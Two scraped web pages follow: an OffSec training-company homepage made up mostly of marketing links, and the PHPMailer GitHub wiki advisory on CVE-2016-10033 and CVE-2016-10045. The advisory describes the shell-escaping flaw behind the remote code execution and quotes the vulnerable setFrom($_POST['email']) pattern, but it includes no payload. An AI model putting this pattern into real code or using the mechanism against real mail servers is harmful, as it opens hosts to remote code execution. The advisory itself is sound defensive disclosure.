  Learn Enterprise

  Address your talent gap through continuous skills development and knowledge acquisition

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise)     [Attain a Certification

  Prove critical knowledge & skills with an industry-standard certification](https://www.offsec.com/courses-and-certifications)   [Get Hands-on Practice

  Challenge yourself in real-world lab environments](https://www.offsec.com/labs/individual)   [Increase Career Prospects

  Ready yourself for the next step in your cybersecurity career](https://www.offsec.com/products)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)
* Pricing Plans & Pricing            Organizations Flexible solutions designed for organizations across industries and sizes      Individuals Find the right training plan for your unique learning needs         [Subscription Pricing

  Provide continuous Learning Library access to build cyber workforce resilience](https://www.offsec.com/pricing/organization)   [Cyber Ranges

  Hands-on training in live-fire, simulation environments](https://www.offsec.com/labs/enterprise)   [Pentesting Services

  Let OffSec conduct a comprehensive vulnerability assessment](https://www.offsec.com/penetration-testing)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Provide continuous learning and skill development with Learn Enterprise. Access to the entire Learning Library and the Enterprise Cyber Range for everyone on your team.

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise/)     [Pricing

  Flexible options based on your learning goals](https://www.offsec.com/pricing/individual)   [![Learn One](/_astro/one.CuIttstx_1iqdIc.svg)   Learn One

  12-month access to a single course, related labs, and two exam attempts](https://www.offsec.com/products/learn-one)   [![Course & Certification Bundle](/_astro/courses.DUpgYt2-_ZJbVTu.svg)   Course & Certification Bundle

  90-day access to a single course, related labs, and one exam attempt](https://www.offsec.com/products/90-day-bundle)   [![Learn Fundamentals](/_astro/fundamentals.iMOuAzP9_Z1YsvOA.svg)   Learn Fundamentals

  12-month access to introductory- and essential-level content](https://www.offsec.com/products/fundamentals)   [Proving Grounds Labs

  OffSec-curated private labs to practice and perfect your pentesting skills](https://www.offsec.com/labs/individual)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200)
* Partners         [Global Partner Program](https://www.offsec.com/global-partners)   [Partner Portal Login](https://partnerportal.offsec.com/?utm_source=offsec#/page/login)   [Find a Partner](https://www.offsec.com/partner-locator)

  Become a Partner

  Add OffSec to your list of training providers

   [Partner with us](https://www.offsec.com/global-partners/#application)
* Community Kali & Community         [Join Our Community](https://www.offsec.com/community-sign-up)   [Kali Linux](http://www.kali.org/get-kali/?utm_source=offsec)   [Community Projects](https://www.offsec.com/community-projects)   [OffSec Discord](https://offs.ec/discord?utm_source=offsec)   [OffSec Live](https://www.twitch.tv/offsecofficial?utm_source=offsec)

  Connect with us

  OffSec office hours every Friday on Twitch

   [OffSec Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
* Resources
  + [Read](https://www.offsec.com/resources)
  - [Blog](https://www.offsec.com/blog/)
  - [Case Studies](https://www.offsec.com/resources/case-study)
  - [Guides](https://www.offsec.com/resources/guides)
  - [White Papers](https://www.offsec.com/resources/whitepaper)
  - [Product Updates](https://www.offsec.com/resources/product-updates)
  + Watch
  - [Webinars](https://www.offsec.com/webinars)
  - [Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
  - [YouTube](https://www.youtube.com/%40OffSecTraining?utm_source=offsec)
  + Learn
  - [Cyberversity](https://www.offsec.com/cyberversity)
  - [Cybersecurity Job Roles](https://www.offsec.com/cybersecurity-roles)
  + Work at OffSec
  - [Careers](https://www.offsec.com/careers)
  - [Values](https://www.offsec.com/values)
  + [Live Training & Events](https://www.offsec.com/training-and-events)
  + [Subscribe to our Newsletters](https://www.offsec.com/subscriptions)
  + [Press Room](https://www.offsec.com/press-room)
  + [Help Center](https://help.offsec.com/hc/en-us?utm_source=offsec)
  + [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)   [View the Resource Center](/resources/)        [Press Release

  Leeds Equity Partners Acquires OffSec

  Leeds Equity Partners announced that it has acquired OffSec, the leading provider of continuous cybersecurity workforce development training and professional education for cybersecurity practitioners from Spectrum Equity

  ![Leeds Equity Partners Acquires OffSec](https://manage.offsec.com/wp-content/uploads/2023/08/Homepage-default-preview.jpg)](https://www.prnewswire.com/news-releases/leeds-equity-partners-acquires-offsec-302275836.html?utm_source=offsec)
      [Buy now](/pre-registration/)  [Sign In](https://portal.offensive-security.com/sign-in/)    [Contact](/contact-us/)

* Solutions Learning Solutions            Learning Library Cyber workforce resilience and career development with hands-on, real-world training      Cyber Ranges Live-fire simulations to train your team and stay ahead of the latest threats         [Courses & Certifications

  Industry-leading certifications and training for continuous learning](https://www.offsec.com/courses-and-certifications)   [Learning Paths

  Focused training to develop skills based on a specific area of interest](https://www.offsec.com/learning/paths)   [Job Roles

  Rigorous training content and labs for the most critical and in-demand job roles](https://www.offsec.com/learning)   [Skills Development

  Focused training to develop critical cybersecurity skills](https://www.offsec.com/learning/skill-paths-pins)   [Industry Frameworks

  Framework-specific training for MITRE ATT&CK, D3FEND and NIST/NICE](https://www.offsec.com/learning/industry-frameworks)   [Explore Learning Library](https://portal.offsec.com/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)     [Enterprise Cyber Range & Versus

  Set up tournaments and test red and blue team skills in a live-fire cyber range](https://www.offsec.com/enterprise/cyber-range)   [Offensive Cyber Range

  Train on the latest attack vectors to address vulnerabilities](https://www.offsec.com/enterprise/cyber-range/offensive)   [Defensive Cyber Range

  Prepare for the next attack with simulated real-world training environments](https://www.offsec.com/enterprise/cyber-range/defensive)   [Watch a demo](https://learn.offsec.com/webinar-cyber-drills-versus/?utm_source=offsec)     [Exclusive

  Hands-on training in live-fire, enterprise environments

  Use our most powerful cyber range to develop a cyber resilient workforce

  ![Hands-on training in live-fire, enterprise environments](https://manage.offsec.com/app/uploads/2024/05/live_fire_feat.png)](https://www.offsec.com/enterprise/cyber-range/versus)
* Why OffSec            Organizations Continuous learning & skill development to build cyber workforce resilience      Individuals Get industry leading training and reinforce learning with hands-on labs         [Teams & Enterprises

  Continuous learning & hands-on skills development for cybersecurity teams](https://www.offsec.com/organizations/enterprise)   [Public Sector

  Unique training for government agencies and educational institutions](https://www.offsec.com/public-sector)   [Use Cases

  Meet critical cyber workforce needs with OffSec's learning platform](https://www.offsec.com/use-cases)   [Industries

  Purpose-built and industry-recognized cybersecurity training](https://www.offsec.com/industry)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Address your talent gap through continuous skills development and knowledge acquisition

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise)     [Attain a Certification

  Prove critical knowledge & skills with an industry-standard certification](https://www.offsec.com/courses-and-certifications)   [Get Hands-on Practice

  Challenge yourself in real-world lab environments](https://www.offsec.com/labs/individual)   [Increase Career Prospects

  Ready yourself for the next step in your cybersecurity career](https://www.offsec.com/products)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)
* Pricing Plans & Pricing            Organizations Flexible solutions designed for organizations across industries and sizes      Individuals Find the right training plan for your unique learning needs         [Subscription Pricing

  Provide continuous Learning Library access to build cyber workforce resilience](https://www.offsec.com/pricing/organization)   [Cyber Ranges

  Hands-on training in live-fire, simulation environments](https://www.offsec.com/labs/enterprise)   [Pentesting Services

  Let OffSec conduct a comprehensive vulnerability assessment](https://www.offsec.com/penetration-testing)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Provide continuous learning and skill development with Learn Enterprise. Access to the entire Learning Library and the Enterprise Cyber Range for everyone on your team.

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise/)     [Pricing

  Flexible options based on your learning goals](https://www.offsec.com/pricing/individual)   [![Learn One](/_astro/one.CuIttstx_1iqdIc.svg)   Learn One

  12-month access to a single course, related labs, and two exam attempts](https://www.offsec.com/products/learn-one)   [![Course & Certification Bundle](/_astro/courses.DUpgYt2-_ZJbVTu.svg)   Course & Certification Bundle

  90-day access to a single course, related labs, and one exam attempt](https://www.offsec.com/products/90-day-bundle)   [![Learn Fundamentals](/_astro/fundamentals.iMOuAzP9_Z1YsvOA.svg)   Learn Fundamentals

  12-month access to introductory- and essential-level content](https://www.offsec.com/products/fundamentals)   [Proving Grounds Labs

  OffSec-curated private labs to practice and perfect your pentesting skills](https://www.offsec.com/labs/individual)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200)
* Partners         [Global Partner Program](https://www.offsec.com/global-partners)   [Partner Portal Login](https://partnerportal.offsec.com/?utm_source=offsec#/page/login)   [Find a Partner](https://www.offsec.com/partner-locator)

  Become a Partner

  Add OffSec to your list of training providers

   [Partner with us](https://www.offsec.com/global-partners/#application)
* Community Kali & Community         [Join Our Community](https://www.offsec.com/community-sign-up)   [Kali Linux](http://www.kali.org/get-kali/?utm_source=offsec)   [Community Projects](https://www.offsec.com/community-projects)   [OffSec Discord](https://offs.ec/discord?utm_source=offsec)   [OffSec Live](https://www.twitch.tv/offsecofficial?utm_source=offsec)

  Connect with us

  OffSec office hours every Friday on Twitch

   [OffSec Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
* Resources
  + [Read](https://www.offsec.com/resources)
  - [Blog](https://www.offsec.com/blog/)
  - [Case Studies](https://www.offsec.com/resources/case-study)
  - [Guides](https://www.offsec.com/resources/guides)
  - [White Papers](https://www.offsec.com/resources/whitepaper)
  - [Product Updates](https://www.offsec.com/resources/product-updates)
  + Watch
  - [Webinars](https://www.offsec.com/webinars)
  - [Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
  - [YouTube](https://www.youtube.com/%40OffSecTraining?utm_source=offsec)
  + Learn
  - [Cyberversity](https://www.offsec.com/cyberversity)
  - [Cybersecurity Job Roles](https://www.offsec.com/cybersecurity-roles)
  + Work at OffSec
  - [Careers](https://www.offsec.com/careers)
  - [Values](https://www.offsec.com/values)
  + [Live Training & Events](https://www.offsec.com/training-and-events)
  + [Subscribe to our Newsletters](https://www.offsec.com/subscriptions)
  + [Press Room](https://www.offsec.com/press-room)
  + [Help Center](https://help.offsec.com/hc/en-us?utm_source=offsec)
  + [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)   [View the Resource Center](/resources/)        [Press Release

  Leeds Equity Partners Acquires OffSec

  Leeds Equity Partners announced that it has acquired OffSec, the leading provider of continuous cybersecurity workforce development training and professional education for cybersecurity practitioners from Spectrum Equity

  ![Leeds Equity Partners Acquires OffSec](https://manage.offsec.com/wp-content/uploads/2023/08/Homepage-default-preview.jpg)](https://www.prnewswire.com/news-releases/leeds-equity-partners-acquires-offsec-302275836.html?utm_source=offsec)
      [Buy now](/pre-registration/) [Sign in](https://portal.offensive-security.com/sign-in/)   [Contact us](/contact-us/)   Learning Solutions  Why OffSec  Plans & Pricing  Partners  Kali & Community  Resources       Dismiss

Looking for Live Training in 2025? -
[View upcoming classes](/training-and-events/)

# Elevating Cyber Workforce and Professional Development

Empowering individuals and organizations to fight cyber threats with indispensable cybersecurity skills and resources.

   [For individuals](/pricing/)  [For organizations](/organizations/enterprise/)
## Trusted by

      ![](/_astro/courses-honeycomb-2.BJsud3cm_AM0V4.svg)
## Learning with OffSec

Our learning platform and library include the most rigorous content, courses, learning paths
and hands-on labs

 [Explore our products](/products/)
## What you'll find in our Learning Library

### 7,800+

Hours of written content

### 1,600+

Videos

### 5,460

Labs

\*Data as of 1/24/2025

 [Watch demo](/resources/gated-content/le-ocr-demo/)
## Find OffSec training for your cybersecurity role or area of responsibility

![](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Essentials

Intermediate

Advanced

   ![](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Essentials

Intermediate

Advanced

   ![](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Essentials

Intermediate

Advanced

   ![](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Essentials

Intermediate

Entry-level

Essentials

Intermediate

Advanced

 [![](/_astro/sec-100.Cpi0-2Uw.svg)
### CyberCore

Gain core knowledge required for any cybersecurity role](/courses/sec-100/)       ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Understand the attacker mindset

 ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Develop hacking and pentesting skills

 ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Expert protections across organizations

    ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Understand defensive requirements

 ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Develop mitigation procedures

 ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Proactive, resilient defenses

    ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Learn risks and track security in development

 ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Integrate security best practices into dev

 ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Security first software development lifecycle

    ![Cybersecurity](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Understand cybersecurity for IT and System Admins

 ![Cybersecurity](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Develop secure processes

= Course Certification

= Learning Path Badge

## What cybersecurity professionals are saying

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)
### Emile Kok

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)
### Douglas Costa

Cyber Threat Intelligence & Threat Hunter

  This certification reinforces my ability to think creatively, manage time and resources effectively, and persist through complex challenges.
## Cybersecurity talent management with OffSec

### Assess

#### Goal of this stage

Understand skills of candidates to pick the right person for open roles.

#### How OffSec can help

Build tournaments to assess candidates in real-world scenarios. Renowned certifications can be used to in the application process.

 [Check out Assessments](/enterprise/cyber-range/)

Assess

### Onboard

#### Goal of this stage

Train teams to get them up to speed for their new roles and build a foundation of shared knowledge across the team.

#### How OffSec can help

Entry-level courses ground teams in the OffSec mindset. Job role based learning paths & courses support specific roles get up to speed faster.

 [Explore the Library](https://portal.offsec.com)

Onboard

### Upskill

#### Goal of this stage

Identify skill gaps and train to fill those gaps to protect the organization.

#### How OffSec can help

Identify skill gaps with learning path assessments & Versus tournaments. Build custom learning paths for team members to get them the training they need to protect the organization.

 [Build a Custom Learning Path](https://learn.offsec.com/hubfs/Creating%20a%20custom%20path.mp4)

Upskill

### Retain

#### Goal of this stage

Build an engaging employee culture and career development plans that continue to challenge employees.

#### How OffSec can help

Build team camaraderie with Versus tournaments. Develop custom training for job roles & increase difficulty over time.

 [Try a Tournament](/enterprise/cyber-range/versus/)

Retain

## Our unique learning approach

#### Growth

Practicing creative applications leads to growth and knowledge expansion

#### Triumph

Create confidence, pattern recognition, wisdom and allow the cycle to repeat for new learnings

#### Trial

The trial process equips our learner to understand, learn, apply, analyze, synthesize and hypothesize

#### Failure

Failure is a key part of learning, how to get unstuck is a key skill. Grit is necessary to learn

#### Adaptation

Creative ideas and approaches will emerge through trial and failure

## What's new at OffSec

   [![](https://www.offsec.com/app/uploads/2025/01/ir-200-450x236.png)

Research & Tutorials

### My Journey with IR-200: Becoming an OffSec Certified Incident Responder (OSIR)

Embark on a journey to become an OffSec Certified Incident Responder (OSIR) through the IR-200 course, as described by a Student Mentor who tested its effectiveness.

Jan 24, 2025

6 min read](/blog/my-journey-with-ir-200-becoming-an-offsec-certified-incident-responder-osir/)   [![](https://www.offsec.com/app/uploads/2025/01/th-200-450x236.png)

Research & Tutorials

### A Student Mentorâs TH-200 and OSTH Learning Experience

Explore the TH-200 course & OSTH exam with an OffSec Mentor’s insights on mastering threat hunting skills.

Jan 24, 2025

9 min read](/blog/a-student-mentors-th-200-and-osth-learning-experience/)   [![](https://www.offsec.com/app/uploads/2024/12/EOY-2024-blog-post-header-450x236.jpg)

OffSec News

### OffSec Yearly Recap 2024

Join us as we explore all our successes in 2024, including exciting new content, courses, and so much more!

Dec 23, 2024

8 min read](/blog/offsec-yearly-recap-2024/)     [View all blogs](/blog/)
## Our free open-source tools

  [![Kali](/_astro/kali.CU8ZWzHb_21DCwb.svg)](https://kali.org)  [![Kali NetHunter](/_astro/KNH.Cqcp042z_Z1swOvJ.svg)](https://www.kali.org/docs/nethunter/)  [![Exploit Database](/_astro/EXDB.BZmZGyho_2oAweA.svg)](https://exploit-db.org)  [![Google hacking database](/_astro/GHDB.BMpIw1YW_kqYpF.svg)](https://www.exploit-db.com/google-hacking-database)  [![Metasploit Unleashed](/_astro/metasploit.CWelKEsw_Z1kLJ3A.svg)](https://www.offsec.com/metasploit-unleashed/)

Get the latest updates around resources, events & promotions from OffSec

 Submit        Products and Pricing

* [Courses & Content](https://www.offsec.com/courses-and-certifications/)
* [Learn Subscriptions](https://www.offsec.com/products/)
* [Proving Grounds Labs](https://www.offsec.com/labs/individual/)
* [Enterprise Cyber Range](https://www.offsec.com/enterprise/cyber-range/)
* [Pricing](https://www.offsec.com/pricing/)
 About OffSec

* [Contact Us](https://www.offsec.com/contact-us/)
* [Careers](https://www.offsec.com/careers/)
* [Why OffSec?](https://www.offsec.com/why-offsec/)
* [Values](https://www.offsec.com/values/)
* [Leadership Team](https://www.offsec.com/leadership-team/)
* [Bug Bounty Program](https://www.offsec.com/bug-bounty-program/)
* [User-Generated Content](https://www.offsec.com/labs/submit/)
 Resources

* [Resource Center](https://www.offsec.com/resources/)
* [Blog](https://www.offsec.com/blog/)
* [OffSec Cyberversity](https://www.offsec.com/cyberversity/)
* [Press Room](https://www.offsec.com/press-room/)
* [Join our Mailing List](https://www.offsec.com/subscriptions/)
* [Help Center](https://help.offensive-security.com/hc/en-us?utm_source=offsec)
* [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)

  [Feedback](https://www.offsec.com/contact-us/)[Legal](https://www.offsec.com/legal-docs/)[Trust & Compliance](https://trust.offsec.com/?utm_source=offsec)[RSS Feed](https://www.offsec.com/feed)  Â© OffSec Services Limited 2025 All rights reserved

=== Content from github.com_c0b01624_20250126_062457.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Fwiki%2FAbout-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Fwiki%2FAbout-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fwiki%2Fshow&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

* [Code](/PHPMailer/PHPMailer)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

# About the CVE 2016 10033 and CVE 2016 10045 vulnerabilities

[Jump to bottom](#wiki-pages-box)
 [Edit](/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities/_edit)
 [New page](/PHPMailer/PHPMailer/wiki/_new)

giantsloar edited this page Jan 3, 2017
·
[13 revisions](/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities/_history)

On December 16th 2016, a remote code execution vulnerability in PHPMailer was reported by [Dawid Golunski](https://legalhackers.com), and described in an [advisory](http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html). This vulnerability can occur in the following circumstances:

1. The script is using PHPMailer's default `isMail()` transport, i.e. using PHP's built-in `mail()` function.
2. The 'From' address is set from user input.
3. The `Sender` property is not set explicitly.
4. The server is not running the postfix mail server

In the absence of a preset `Sender` property, it is copied from the from address. This in turn is built into a string, prefixed with `-f` to designate a sender address, and passed into the `$additional_parameters` parameter of the PHP [`mail()` function](http://php.net/manual/en/function.mail.php).

All addresses used by PHPMailer are validated before being used, however, it's possible to construct a valid email address that also constitutes an executable command when passed to the shell via `mail()`.

This vulnerability constitutes [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033), and was thought to be resolved by applying [`escapeshellarg()`](http://php.net/manual/en/function.escapeshellarg.php) to the address, and released as PHPMailer 5.2.20, with a subsequent cleanup in [PHPMailer 5.2.21](https://github.com/PHPMailer/PHPMailer/releases/tag/v5.2.21).

#Act II
The documentation for `mail()` mentions that [`escapeshellcmd()`](http://php.net/manual/en/function.escapeshellcmd.php) is applied internally to the command generated by `mail()`, and that 'dangerous' characters should be escaped. Unfortunately this clashes with what `escapeshellarg()` does, and the nested combination of `escapeshellcmd(escapeshellarg($address))` can result in a crafted address breaking out of the escaping, resulting in an executable command again. This was also spotted by Dawid Golunski ([advisory](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)) and reported as [CVE-2016-10045](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10045). Unhelpfully, an exploit for this was posted on an open mailing list the same day, making this a 0-day vulnerability.

This is a much more insidious problem because it's really a problem with PHP internals, and the only reliable mitigation is to prevent use of valid addresses that might also be exploits, which requires breaking RFC compliance for sender addresses. The `escapeshellcmd` and `escapeshellarg` functions make assumptions about the underlying shell environment (for example what character it uses for escaping, which may not be `\`, or what character set is in use), so their use cannot be considered safe especially across platforms - the only safe route is to apply severe restrictions to the sender address in this context. A patch to this effect was provided by @Zenexer and released in [PHPMailer 5.2.20](https://github.com/PHPMailer/PHPMailer/releases/tag/v5.2.20). @Zenexer also provided [a technical description of the problems surrounding shell escaping in PHP](https://gist.github.com/Zenexer/40d02da5e07f151adeaeeaa11af9ab36).

A proper fix for this would be to rewrite the PHP mail function so that it treats `$additional_parameters` as an array of individual configuration elements that can be processed separately, not a string, or more thoroughly, to not invoke `sendmail` via a shell at all, avoiding escaping issues altogether.

#You're safe if...
You need to be doing one key thing wrong in order to be vulnerable to this attack: using a user-supplied address as the From address, for example:

```
$mail->setFrom($_POST['email']);
```

If you're not doing that, you've nothing to worry about, but unfortunately this is quite a common pattern on naïve 'contact us' forms (see Stack Overflow for many examples) because it means you can reply to the message and it will go directly to the supposed sender. However, this is bad practice because it's forging the from address, and so it will likely fail SPF and DMARC checks and you will have difficulty getting messages delivered. The correct way to do this is along the lines of:

```
$mail->setFrom('contact@example.com'); //Send from a fixed, valid address in your own domain, perhaps one that allows you to easily identify that it originated on your contact form
$mail->addAddress('me@example.com'); //Send to a fixed, valid address in your own domain
$mail->addReplyTo($_POST['email']); //The submitter's address (supposedly) - this is automatically validated before it's accepted so you should check the return value from this function
```

You are also safe if you're using PHPMailer's SMTP transport (i.e. you call `$mail->isSMTP()` in your code), as that transport does not execute shell commands.

You're indirectly protected if you use postfix as your mail server (the default in many Linux distros), because it lacks support for sendmail's `-X` option that permits the creation of executable commands. However, you shouldn't rely on this, as it's possible that other exploits for the same vulnerability will affect postfix.

#Don't think you're safe if...
You're not using PHPMailer? Both of these vulnerabilities occur in other popular PHP email libraries and applications too - for example [Swiftmailer](https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html), [zend\_mail](https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html), and [roundcube](https://blog.ripstech.com/2016/roundcube-command-execution-via-email/), and there may be many more.

#How to avoid issues in future?
CVE-2016-10045 particular has enormous implications well beyond PHPMailer, so **check your sources**, and **help their maintainers** spot and fix problems like this before they escape into the wild. There may be other exploits found for `mail()` (keep an eye on [Dawid Golunski's white paper](https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html) on the subject), so the most important thing is to make sure you **stay up to date with *all* your packages**, not just PHPMailer.

